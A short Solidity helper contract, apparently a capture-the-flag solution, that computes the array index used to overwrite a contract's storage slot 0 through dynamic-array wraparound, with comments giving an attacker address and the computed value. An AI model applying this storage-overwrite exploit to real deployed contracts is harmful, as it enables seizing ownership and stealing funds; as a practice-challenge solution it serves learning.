pragma solidity ^0.5.0;


contract Attack {

    function calculate() pure public returns (bytes32){
        return bytes32(uint(-1) + 1 - uint(keccak256(abi.encode(bytes32(uint(1))))));
    }    
}
//0x000000000000000000000000203560aCa0Aa5AAc09d9708CE29b60Aa3E4366A8 - bytes32 version of my Ethereum address.
//Addresses in Solidity are 20 bytes.

//Output is 0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a.

//uint(-1) + 1 is 2**256.